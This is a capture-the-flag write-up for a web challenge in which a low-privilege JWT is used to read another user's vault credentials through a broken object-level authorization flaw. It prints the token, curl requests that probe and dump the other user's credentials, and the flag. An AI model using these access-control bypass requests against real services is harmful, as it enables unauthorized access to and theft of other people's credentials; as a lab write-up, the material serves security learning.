# CTF Writeup — Angry Employee (CNCC 2026)

**Challenge:** angry-employee-e815f20  
**Category:** Web / Broken Access Control  
**URL:** https://angry-employee-e815f20.cncc-2026.xyz

---
<img width="2557" height="1527" alt="image" src="https://github.com/user-attachments/assets/742c48e8-a88a-4c64-af91-812b5ad3c30f" />

## Overview

This challenge involves exploiting a broken object-level authorization (BOLA/IDOR) vulnerability in a credential vault application called **VaultGuard**. By using a low-privilege JWT token, we can access another user's stored credentials — including the flag.

---

## Step-by-Step Solution

### Step 1 — Log In

Create an account (or log in) at the target application:

```
https://angry-employee-e815f20.cncc-2026.xyz
```

### Step 2 — Extract the JWT Token

Open **DevTools → Application → Storage → Local Storage** and find the JWT token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5NGFjYjFmYi1hNmZmLTQ4ZGMtYTU2Yy1kOTAwNmZlZGMyZGQiLCJlbWFpbCI6ImhhaGFAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsImlhdCI6MTc4MjM3ODY3NCwiZXhwIjoxNzgyMzgyMjc0LCJqdGkiOiI5ZTBiZmEwMy0zZmVmLTQzODAtYmRmMy0xMjY0NDc4ZTgxMzIifQ._I7K0PUq9hv7eZO5S1-JtwOdO9oKIgAFc2eVQtV2RPA
```

Decoding the payload reveals the token belongs to a regular `member` role user (`haha@gmail.com`).

Set it as a shell variable for convenience:

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5NGFjYjFmYi1hNmZmLTQ4ZGMtYTU2Yy1kOTAwNmZlZGMyZGQiLCJlbWFpbCI6ImhhaGFAZ21haWwuY29tIiwicm9sZSI6Im1lbWJlciIsImlhdCI6MTc4MjM3ODY3NCwiZXhwIjoxNzgyMzgyMjc0LCJqdGkiOiI5ZTBiZmEwMy0zZmVmLTQzODAtYmRmMy0xMjY0NDc4ZTgxMzIifQ._I7K0PUq9hv7eZO5S1-JtwOdO9oKIgAFc2eVQtV2RPA"
BASE="https://angry-employee-e815f20.cncc-2026.xyz"
```

### Step 3 — Browse the Users List

Navigate to the Users page:

```
https://angry-employee-e815f20.cncc-2026.xyz/#/users
```

Browse through all users. Most have credentials stored in the vault. One user — with ID `00000000-0000-0000-0000-000000000013` — has no credentials visible through the UI.

### Step 4 — Probe the Target User via API

Use `curl` with your JWT token to send a `PUT` request to the target user's API endpoint. This reveals that the endpoint is accessible without proper authorization checks:

```bash
curl -k -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"vault_filter":""}' \
  "$BASE/api/users/00000000-0000-0000-0000-000000000013"
```

The response confirms the endpoint is reachable and the user exists — meaning the API does **not** enforce object-level authorization.

### Step 5 — Dump the Credentials (Flag)

Now fetch the credentials for the target user directly:

```bash
curl -k \
  -H "Authorization: Bearer $TOKEN" \
  "$BASE/api/users/00000000-0000-0000-0000-000000000013/credentials"
```

The response returns the full credential entries for that user, including the **Production Master Key** and the flag:

```
MPTC{y0u_d3s3rve_1t_4_firing_m3_470b92b51}
```
---

## Vulnerability Summary

| Detail | Value |
|---|---|
| **Vulnerability Type** | Broken Object Level Authorization (BOLA / IDOR) |
| **Affected Endpoint** | `/api/users/{id}/credentials` |
| **Impact** | Any authenticated user can read another user's vault credentials |
| **Root Cause** | The API does not verify that the requesting user owns the target resource |

---
